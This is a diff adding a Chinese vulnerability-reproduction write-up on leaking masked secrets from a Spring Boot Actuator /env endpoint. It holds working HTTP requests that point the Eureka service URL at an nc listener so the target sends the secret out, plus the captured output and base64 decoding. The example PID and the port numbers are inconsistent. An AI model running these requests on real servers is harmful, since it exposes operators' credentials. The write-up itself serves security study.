@@ -1,4 +1,85 @@
-# SpringBoot_Actuator_RCE 漏洞复现
+# SpringBoot env 获取* 敏感信息 (一)
+
+当我们直接访问 springboot 站点时,可以看到某些 password 字段填充了*
+
+通过${name} 可以获取明文字段
+
+参考 `https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA`
+
+具体实现过程:
+
+例如: 我们要获取 pid 参数值
+
+```
+"PID": "10648",
+```
+
+
+```
+POST /env HTTP/1.1
+Host: 10.20.24.191:8090
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+
+eureka.client.serviceUrl.defaultZone=http://${PID}@10.20.24.191:2444/
+
+```
+然后 post refresh 任意内容,触发漏洞
+```
+POST /refresh HTTP/1.1
+Host: 10.20.24.191:8090
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+12312
+```
+
+当服务器 nc 监听端口4444 时,接受到
+
+
+```
+root@kali:/tmp# nc -lvvp 2444
+listening on [any] 2444 ...
+connect to [10.20.24.191] from kali [10.20.24.191] 40960
+GET /xstream/apps/ HTTP/1.1
+Accept: application/json
+DiscoveryIdentity-Name: DefaultClient
+DiscoveryIdentity-Version: 1.4
+DiscoveryIdentity-Id: 10.20.24.191
+Accept-Encoding: gzip
+Host: 10.20.24.191:2444
+Connection: Keep-Alive
+User-Agent: Java-EurekaClient/v1.4.11
+Authorization: Basic MzgzNDY6bnVsbA==
+```
+
+`Authorization: Basic MzgzNDY6bnVsbA==`
+
+
+base64 解码得到
+
+```
+root@kali:/tmp# echo MzgzNDY6bnVsbA== |base64 -d
+38346:null
+```
+和上面的 pid 信息一样
+
+
+
+
+# SpringBoot_Actuator_RCE 漏洞复现 (二)
 
 
 ## 0x01 环境搭建
